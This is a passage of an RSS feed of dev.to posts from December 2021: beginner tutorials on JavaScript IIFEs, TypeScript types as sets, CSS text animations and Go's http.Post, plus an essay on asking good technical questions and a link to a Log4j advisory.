&lt;a href="https://businessinsights.bitdefender.com/technical-advisory-zero-day-critical-vulnerability-in-log4j2-exploited-in-the-wild"&gt;https://businessinsights.bitdefender.com/technical-advisory-zero-day-critical-vulnerability-in-log4j2-exploited-in-the-wild&lt;/a&gt;&lt;/p&gt;

</description>
      <category>security</category>
      <category>java</category>
      <category>opensource</category>
    </item>
    <item>
      <title>Are you expected to know all http status codes?</title>
      <author>pandaquests</author>
      <pubDate>Sat, 25 Dec 2021 18:21:07 +0000</pubDate>
      <link>https://dev.to/pandaquests/are-you-expected-to-know-all-http-status-codes-19j4</link>
      <guid>https://dev.to/pandaquests/are-you-expected-to-know-all-http-status-codes-19j4</guid>
      <description>&lt;p&gt;I just got an interview and I was asked different http status and what their meaning was.&lt;/p&gt;

&lt;p&gt;Besides the typical ones , 200, 203, 300, 404, 500, I couldn't come up with anything because you can look this up and shouldn't remember it by heart. That would be a waste of mental capacity IMO. Or am I wrong? Is it expected to know these things as a web developer?&lt;/p&gt;

</description>
      <category>interview</category>
      <category>webdev</category>
      <category>programming</category>
      <category>http</category>
    </item>
    <item>
      <title>Simple CSS Text Animations</title>
      <author>Kiran Raj R</author>
      <pubDate>Sat, 25 Dec 2021 18:20:00 +0000</pubDate>
      <link>https://dev.to/kiranrajvjd/simple-css-text-animations-1nee</link>
      <guid>https://dev.to/kiranrajvjd/simple-css-text-animations-1nee</guid>
      <description>&lt;p&gt;Hi, I made some simple CSS text effects that can be used in your projects, these are beginner level animations. The code is not optimized and accessibility is not taken into account. I just want to show that animations like these can be made using CSS. You can use these simple animations with your creativity to make awesome text animations, hope you will like this. Happy Coding !!&lt;/p&gt;

&lt;p&gt;&lt;iframe height="600" src="https://codepen.io/kiran-r-raj/embed/dyVVPPM?height=600&amp;amp;default-tab=result&amp;amp;embed-version=2"&gt;
&lt;/iframe&gt;
&lt;br&gt;
&lt;iframe height="600" src="https://codepen.io/kiran-r-raj/embed/MWEvRPW?height=600&amp;amp;default-tab=result&amp;amp;embed-version=2"&gt;
&lt;/iframe&gt;
&lt;br&gt;
&lt;iframe height="600" src="https://codepen.io/kiran-r-raj/embed/XWeezGo?height=600&amp;amp;default-tab=result&amp;amp;embed-version=2"&gt;
&lt;/iframe&gt;
&lt;br&gt;
&lt;iframe height="600" src="https://codepen.io/kiran-r-raj/embed/bGoWgaj?height=600&amp;amp;default-tab=result&amp;amp;embed-version=2"&gt;
&lt;/iframe&gt;
&lt;/p&gt;

&lt;p&gt;My &lt;a href="https://codepen.io/collection/RzReVd"&gt;collection&lt;/a&gt; of text effects in &lt;a href="https://codepen.io/collection/RzReVd"&gt;codepen&lt;/a&gt;.&lt;/p&gt;

</description>
      <category>css</category>
      <category>webdev</category>
      <category>javascript</category>
      <category>codenewbie</category>
    </item>
    <item>
      <title>What is IIFE in JavaScript ?</title>
      <author>Kamran Ahmad</author>
      <pubDate>Sat, 25 Dec 2021 17:24:12 +0000</pubDate>
      <link>https://dev.to/officialkamran/what-is-iife-in-javascript--45p0</link>
      <guid>https://dev.to/officialkamran/what-is-iife-in-javascript--45p0</guid>
      <description>&lt;p&gt;Sometime in JavaScript we need a function that executes only once and never again. Basically a function that disappears right after its called once. How can we achieve this? for example we could do this:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;const func1 = function(){
             console.log('this function will never run again!`)
                }
 func1();
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;But we definitely can call this func1() again if we want. This is &lt;strong&gt;NOT&lt;/strong&gt; what we want to do. We want to execute a function immediately without having to save it somewhere.&lt;br&gt;
So this is how we do that,&lt;br&gt;
we simply write the function expression itself without assign it to any variable.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;function(){
console.log('This function will never run again')
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;if we run this, we would get an error &lt;em&gt;function statements require a function name&lt;/em&gt; an that's because JavaScript expects a function statement, but we simply start a new line of code with the function keyword.&lt;/p&gt;

&lt;p&gt;Here we can still trick JavaScript into thinking that this is just an expression. We do that by simply wrapping all of this into GROUPING OPERATOR().&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;(function(){
   console.log('This is will never run again!')
});
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;so we basically transform the previous statement into an expression. But the function didn't execute yet. To execute the function we need to call it like this (adding '()' next to it, like we do with regular function call).&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;(function(){
   console.log('This is will never run again!')
})();
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;So we create a function expression and we immediately call it. which is why this pattern is called &lt;strong&gt;Immediately Invoked Function Expression(IIFE).&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;The same would also work for an arrow function this way.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;(() =&amp;gt; console.log('This function will never run again!'))();
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;This will also never run again.&lt;/p&gt;

&lt;p&gt;so this is not really a feature, of the JavaScript.&lt;/p&gt;

&lt;p&gt;it's more of a pattern, that some developers come up with and it is widely used.&lt;/p&gt;

&lt;p&gt;This design pattern is also known as a &lt;strong&gt;Self-Executing Anonymous Function.&lt;/strong&gt;&lt;br&gt;
Self-Executing -&amp;gt; it executes the moment it is created.&lt;br&gt;
Anonymous -&amp;gt; it has no name and is not stored variable.&lt;/p&gt;

</description>
      <category>javascript</category>
      <category>webdev</category>
      <category>beginners</category>
      <category>tutorial</category>
    </item>
    <item>
      <title> Do you really know TypeScript? (1): Thinking in sets </title>
      <author>Alex Menor</author>
      <pubDate>Sat, 25 Dec 2021 17:14:29 +0000</pubDate>
      <link>https://dev.to/alexmenor/do-you-really-know-typescript-1-thinking-in-sets-55dm</link>
      <guid>https://dev.to/alexmenor/do-you-really-know-typescript-1-thinking-in-sets-55dm</guid>
      <description>&lt;p&gt;I know many people, including myself, whose first experience with TypeScript was to write annotations in some variables and to add &lt;code&gt;as any&lt;/code&gt; until the transpiler stopped complaining.&lt;/p&gt;

&lt;p&gt;But at some point you realize that you &lt;strong&gt;really&lt;/strong&gt; should dig a little deeper into TypeScript and finally understand those errors.&lt;/p&gt;

&lt;p&gt;It's true that you can technically build the same websites/systems with and without TypeScript, but its benefits are huge:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Catch errors at compile time instead of at runtime&lt;/li&gt;
&lt;li&gt;Autocomplete ("it was &lt;code&gt;user.phone&lt;/code&gt; or &lt;code&gt;user.phoneNumber&lt;/code&gt;?" 🤔)&lt;/li&gt;
&lt;li&gt;Language services (enabling some IDE's refactors for example)&lt;/li&gt;
&lt;li&gt;Better domain modelling&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Using TypeScript is not only investing in the code's maintainability, it is also investing in the developer's productivity.&lt;/p&gt;

&lt;p&gt;Okay, you are (or were already) convinced that TypeScript is worth learning, what is this series for?&lt;/p&gt;

&lt;p&gt;In this series I will go through many aspects of the language that were not obvious to me even after having already done some projects with it.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;You will stop wrestling with TypeScript 🤼‍♀️&lt;/strong&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#seeing-types-as-sets-of-values"&gt;
  &lt;/a&gt;
  Seeing types as sets of values
&lt;/h2&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight typescript"&gt;&lt;code&gt;&lt;span class="c1"&gt;// what can we assign to it?&lt;/span&gt;

&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;foo&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;Bar&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;??&lt;/span&gt;&lt;span class="p"&gt;?&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;We can assign any value that belongs to a subtype of &lt;code&gt;Bar&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--9rO9XxRL--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/4vi9ps43y8t4p48cl1m2.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--9rO9XxRL--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/4vi9ps43y8t4p48cl1m2.png" alt="Image description" width="880" height="968"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;One cool thing of this system is that you can use set operators (among others) to create new types.&lt;/p&gt;

&lt;p&gt;For example the union operator: &lt;code&gt;number | string&lt;/code&gt; is the set of all numbers and strings. &lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--Xp-uW6pA--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/dnw4kqmr4qub7mfgxxo6.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--Xp-uW6pA--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/dnw4kqmr4qub7mfgxxo6.png" alt="Image description" width="880" height="863"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#structural-typing"&gt;
  &lt;/a&gt;
  Structural typing
&lt;/h2&gt;

&lt;p&gt;To know if a value belongs or not to a type, TypeScript only focuses on the shape that it has.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight typescript"&gt;&lt;code&gt;&lt;span class="kd"&gt;class&lt;/span&gt; &lt;span class="nx"&gt;Person&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nl"&gt;name&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kr"&gt;string&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="c1"&gt;// We didn't use the "new" keyword&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;person&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;Person&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
   &lt;span class="na"&gt;name&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;Jame&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;That wouldn't be possible in nominal type systems.&lt;/p&gt;

&lt;p&gt;Let's see a little harder example:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight typescript"&gt;&lt;code&gt;&lt;span class="kd"&gt;type&lt;/span&gt; &lt;span class="nx"&gt;File&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="na"&gt;name&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kr"&gt;string&lt;/span&gt;
    &lt;span class="na"&gt;extension&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kr"&gt;string&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kd"&gt;type&lt;/span&gt; &lt;span class="nx"&gt;Folder&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="na"&gt;name&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kr"&gt;string&lt;/span&gt;
    &lt;span class="na"&gt;color&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kr"&gt;string&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kd"&gt;type&lt;/span&gt; &lt;span class="nx"&gt;DesktopItem&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;File&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nx"&gt;Folder&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;code&gt;DesktopItem&lt;/code&gt; contains all the objects that either have the properties (name and type) of &lt;code&gt;File&lt;/code&gt; or &lt;code&gt;Folder&lt;/code&gt;.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight typescript"&gt;&lt;code&gt;&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;item&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;DesktopItem&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;couldBeFileOrFolder&lt;/span&gt;

&lt;span class="c1"&gt;// should work, right?&lt;/span&gt;
&lt;span class="nx"&gt;givenItem&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;extension&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;It doesn't work because only &lt;code&gt;File&lt;/code&gt; has that property and the specific type of &lt;code&gt;item&lt;/code&gt; could be &lt;code&gt;Folder&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;When we declare the union of two types the result is a type that has the intersection of the properties. In this case objects with a property &lt;code&gt;name&lt;/code&gt; of type &lt;code&gt;string&lt;/code&gt;, because it is the only property that they have in common.&lt;/p&gt;

&lt;p&gt;It's also true the other way around: The intersection of two types results in a type that has the union of the properties.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight typescript"&gt;&lt;code&gt;&lt;span class="kr"&gt;keyof&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;A&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nx"&gt;B&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kr"&gt;keyof&lt;/span&gt; &lt;span class="nx"&gt;A&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kr"&gt;keyof&lt;/span&gt; &lt;span class="nx"&gt;B&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="kr"&gt;keyof&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;A&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nx"&gt;B&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kr"&gt;keyof&lt;/span&gt; &lt;span class="nx"&gt;A&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kr"&gt;keyof&lt;/span&gt; &lt;span class="nx"&gt;B&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#the-empty-set-and-the-universal-set"&gt;
  &lt;/a&gt;
  The empty set and the universal set
&lt;/h2&gt;

&lt;p&gt;If we can think of types as sets of values, what types are the empty set and the universal set?&lt;/p&gt;

&lt;p&gt;&lt;code&gt;never&lt;/code&gt; is the empty set and &lt;code&gt;unknown&lt;/code&gt; is the universal set.&lt;/p&gt;

&lt;p&gt;These are both very special and we'll talk about them soon.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#things-to-remember"&gt;
  &lt;/a&gt;
  Things to remember
&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Types are sets of values&lt;/li&gt;
&lt;li&gt;One value of type &lt;code&gt;Y&lt;/code&gt; is assignable to a type &lt;code&gt;X&lt;/code&gt; if &lt;code&gt;Y&lt;/code&gt; is a subtype of &lt;code&gt;X&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Type compatibility in TypeScript is determined by structural typing.&lt;/li&gt;
&lt;/ul&gt;

</description>
      <category>typescript</category>
      <category>programming</category>
      <category>productivity</category>
      <category>webdev</category>
    </item>
    <item>
      <title>How I Ask Questions as a Software Engineer</title>
      <author>Navendu Pottekkat</author>
      <pubDate>Sat, 25 Dec 2021 16:19:17 +0000</pubDate>
      <link>https://dev.to/navendu/how-i-ask-questions-as-a-software-engineer-bp0</link>
      <guid>https://dev.to/navendu/how-i-ask-questions-as-a-software-engineer-bp0</guid>
      <description>&lt;p&gt;&lt;em&gt;Cover Photo by &lt;a href="https://unsplash.com/@nci?utm_source=unsplash&amp;amp;utm_medium=referral&amp;amp;utm_content=creditCopyText"&gt;National Cancer Institute&lt;/a&gt; on &lt;a href="https://unsplash.com/s/photos/indian-classroom?utm_source=unsplash&amp;amp;utm_medium=referral&amp;amp;utm_content=creditCopyText"&gt;Unsplash&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;I ask a lot of questions to my peers and to strangers on public forums in the internet. This year, I have been trying to improve this process to ask better questions. Here is how I do it.&lt;/p&gt;

&lt;p&gt;But first of all,&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#what-are-good-questions"&gt;
  &lt;/a&gt;
  What are Good Questions?
&lt;/h2&gt;

&lt;p&gt;Good questions are the ones which are easy to answer.&lt;/p&gt;

&lt;p&gt;Our goal for asking a question is to have the other person explain what they know in a way you can understand. A series of good questions is the key to a good answer.&lt;/p&gt;

&lt;p&gt;Bad:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;J: What happens when we strip the binaries? (Too vague and broad)&lt;/p&gt;

&lt;p&gt;N: Stripped binaries don’t have debugging information. So its size is reduced ... (Answers with a lot of irrelevant information)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Good:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;J: I see that we are stripping the binaries to reduce its size before publishing. I found that it shouldn’t affect the performance. Is that right? What other implications does this have? (Clear question, easy to answer)&lt;/p&gt;

&lt;p&gt;N: Stripping only removes the debugging information. It wouldn’t affect the performance in any way. But it will be difficult to debug if we run into any issues as debug symbols are removed from the traceback.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2&gt;
  &lt;a href="#the-problem-with-bad-questions"&gt;
  &lt;/a&gt;
  The Problem with Bad Questions
&lt;/h2&gt;

&lt;p&gt;Bad questions can derail a conversation easily.&lt;/p&gt;

&lt;p&gt;For me, asking bad questions have often resulted in:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;the person explaining things irrelevant to my question.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;the person explaining things I have no clue of.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;the person explaining what I already know.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;the person not answering the question at all (especially for under researched questions).&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;All of this boils down to you or both of you walking away frustrated and without a clear answer.&lt;/p&gt;

&lt;p&gt;At this point it should be fairly obvious why you should focus on asking questions properly. So, here is my process.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#who-are-you-asking"&gt;
  &lt;/a&gt;
  Who are you Asking?
&lt;/h2&gt;

&lt;p&gt;Who you are asking a question should impact how you ask the question. Let me explain.&lt;/p&gt;

&lt;p&gt;If you are asking your coworker who works on your project or is familiar of the particular niche, you can fairly assume that the person has some context on what you are asking.&lt;/p&gt;

&lt;p&gt;This means that there would be less things for you to explain and you can build your explanation from your shared knowledge. But it is a different game when you are asking questions to the people of the interwebs.&lt;/p&gt;

&lt;p&gt;I have had my share of bashing from people in Stack Overflow when I began programming. I get that having a high bar for quality assurance helps Stack Overflow be the go to place to ask questions but some of the moderators are so trigger happy that they will shoot you (your question) down right away.&lt;/p&gt;

&lt;p&gt;But anyway, the important thing to remember here is that the person reading your question has very little context about your situation. It is obvious when a person has put very little effort in asking questions and these questions are the first to get the bashing.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#when-to-ask"&gt;
  &lt;/a&gt;
  When to Ask?
&lt;/h2&gt;

&lt;p&gt;If you have a lot of questions or if you think answering your question will take time, it is better to schedule a time when you are both available.&lt;/p&gt;

&lt;p&gt;If your questions are quick, it is better to ask them right away if it ends up saving you a lot of time.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#google-first-ask-later"&gt;
  &lt;/a&gt;
  Google First, Ask Later
&lt;/h2&gt;

&lt;p&gt;One of my biggest pet peeve is people who ask technical questions that can be answered by the first result of a Google search. It shows little effort from their part and now I just ask people to Google it and do not bother to answer until they do their homework.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;I maintain a project called Meshery and one of the new contributors (who came in to get a &lt;a href="https://summerofcode.withgoogle.com/"&gt;GSoC internship&lt;/a&gt;) literally asked if I could explain what Meshery is.&lt;/p&gt;

&lt;p&gt;We have a website, 100+ pages of documentation, recordings of conference talks and technical documentation, all sent to the user as they join the community.&lt;/p&gt;

&lt;p&gt;You know how that conversation went.&lt;/p&gt;

&lt;p&gt;It would have been different if they had asked me something along the lines of “I have been going through Meshery’s docs and been trying it out locally. I’m not clear how Meshery adds value if a person is already using a service mesh. Could you point me to any docs where this is explained better?”.&lt;/p&gt;

&lt;p&gt;Think for a moment on how you would have answered in these scenarios.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Doing a bit of research can help you build some foundational knowledge to ask a set of better questions.&lt;/p&gt;

&lt;p&gt;The “Google first, ask later” motto is only good as a rule of thumb. Nothing has stopped me from asking obvious, googleable (&lt;a href="https://en.wiktionary.org/wiki/googleable"&gt;it is a real word&lt;/a&gt;) questions when in conversation with someone.&lt;/p&gt;

&lt;p&gt;To sum it up, take some effort, do your homework and then ask your questions. Don’t expect to be spoon-fed.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#is-that-right"&gt;
  &lt;/a&gt;
  Is that Right?
&lt;/h2&gt;

&lt;p&gt;Let’s go back to the “stripped binary” example.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;J: I see that we are stripping the binaries to reduce its size before publishing. I found that it shouldn’t affect the performance. Is that right? What other implications does this have?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;See how stating what you already lets you build the rest of conversation?&lt;/p&gt;

&lt;p&gt;To ask this question, you have to spend some time and dig through what a stripped binary is and how it is different from a "normal" binary. The time taken to understand and formulate that question is time well spent.&lt;/p&gt;

&lt;p&gt;On the receiving end, the person will see that you have spent time in this and is not just asking them to do your work. It will also be easier to answer your question building by on your foundational knowledge.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#vague-precise-questions"&gt;
  &lt;/a&gt;
  &lt;del&gt;Vague&lt;/del&gt; Precise Questions
&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;J: How do I use a Kind cluster to setup my development environment?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;If you ask me this, I would reply with a link to the Kind docs. But this wasn’t what they intended to ask. So they say,&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;J: I tried this but it is not working.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Well, there are million different reasons for this to not work. I am not Doctor Strange to evaluate all the possibilities in a second! A little bit more context might help.&lt;/p&gt;

&lt;p&gt;I will cut to the chase and say how I would ask this question.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;N: I was trying to setup Kind for my local development environment. I am on macOS. I have Docker Desktop and Kind running. I have also setup Metallb LoadBalancer and I see the external IP of the service as shown on the logs below. Still, I am not able to reach it from my host machine. Is there something I’m missing?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Then that senior engineer with years of experience can jump right in and say,&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;S: On macOS, Docker does not expose the docker network to the host. You can try port-forwarding to reach the pods.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;See how easy it was to answer?&lt;/p&gt;

&lt;p&gt;This goes for all questions. The more precise you are with your questions, more easy it is to answer.&lt;/p&gt;

&lt;p&gt;This also prevents the person answering from going off on a tangent explaining irrelevant details which you may either not care about or aren’t relevant to your actual question.&lt;/p&gt;

&lt;p&gt;Another way to prevent shooting off on a tangent is to ask questions that can be answered by a simple yes/no.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;J: &lt;del&gt;Why are we using this gRPC middleware instead of directly calling the required service?&lt;/del&gt; &lt;/p&gt;

&lt;p&gt;J: Are we using this gRPC middleware to convert between two different configuration formats?&lt;/p&gt;

&lt;p&gt;N: Yes.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;The person usually goes to explain why yes/no after this but these questions are easy to answer and I almost always get quick responses.&lt;/p&gt;

&lt;p&gt;These questions are quite useful when you are in conversation with a person where they are explaining something to you. This segues into my next point.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#when-in-doubt-ask-more-questions"&gt;
  &lt;/a&gt;
  When in Doubt, Ask More Questions
&lt;/h2&gt;

&lt;p&gt;Imposter syndrome is real.&lt;/p&gt;

&lt;p&gt;When I started working with other people, I often stopped myself from saying “I don’t understand” thinking I would look stupid.&lt;/p&gt;

&lt;p&gt;I have then come to learn that if you ask a “stupid” question, you are stupid for the day but if you don’t, you are stupid for life (because you will always stop yourself from asking questions, ending up not understanding things completely... umm, you get it right?).&lt;/p&gt;

&lt;p&gt;This means when you get an answer and you are not completely satisfied,&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;say what you don’t understand.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;ask more clarifying questions.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;stop the speaker and ask more specific questions.&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Confronting the imposter syndrome is hard but it has been helpful to me in knowing that &lt;a href="https://www.ted.com/talks/elizabeth_cox_what_is_imposter_syndrome_and_how_can_you_combat_it"&gt;everyone else face this too&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;When you start thinking “maybe I’m just not smart enough to understand the answer”, remember that people want to help you. You just have to help them help you!&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#learning-in-public"&gt;
  &lt;/a&gt;
  Learning in Public
&lt;/h2&gt;

&lt;p&gt;Ask questions in a public channel instead of DMs.&lt;/p&gt;

&lt;p&gt;This may not work in every situation but I try to do this more often now.&lt;/p&gt;

&lt;p&gt;This will document the discussions publicly and would also help any others looking in. You can then always point people to this discussion if they ask the same question.&lt;/p&gt;

&lt;p&gt;Take Stack Overflow for example. You almost always find answers to problems you are facing from questions asked by someone else.&lt;/p&gt;

&lt;p&gt;The imposter syndrome shifts to the next gear here. Face it head-on.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#asking-good-questions-is-a-skill"&gt;
  &lt;/a&gt;
  Asking Good Questions is a Skill
&lt;/h2&gt;

&lt;p&gt;And like all skills, it is sharpened with practice.&lt;/p&gt;

&lt;p&gt;Asking the right questions will help you extract the answers you want. In most scenarios, it is not that the person answering is incapable, but you are not asking the right questions.&lt;/p&gt;

&lt;p&gt;I have gotten better at this over the year and I am still working out the kinks in my process.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;This might be a good post to come back in a year to reflect and improve upon.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;To summarise this post in a sentence,&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Make it easy for people to help you.&lt;/em&gt;&lt;/p&gt;

</description>
    </item>
    <item>
      <title>http.Post Golang example
</title>
      <author>Ramu Mangalarapu</author>
      <pubDate>Sat, 25 Dec 2021 16:12:28 +0000</pubDate>
      <link>https://dev.to/ramu_mangalarapu/httppost-golang-example-5jp</link>
      <guid>https://dev.to/ramu_mangalarapu/httppost-golang-example-5jp</guid>
      <description>&lt;p&gt;Hello, &lt;/p&gt;

&lt;p&gt;Today, I am going to write small tutorial about basic usage of &lt;a href="https://pkg.go.dev/net/http"&gt;http.Post&lt;/a&gt; method in Golang. Please ignore if there is any mistakes, thank you.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight go"&gt;&lt;code&gt;&lt;span class="k"&gt;package&lt;/span&gt; &lt;span class="n"&gt;main&lt;/span&gt;

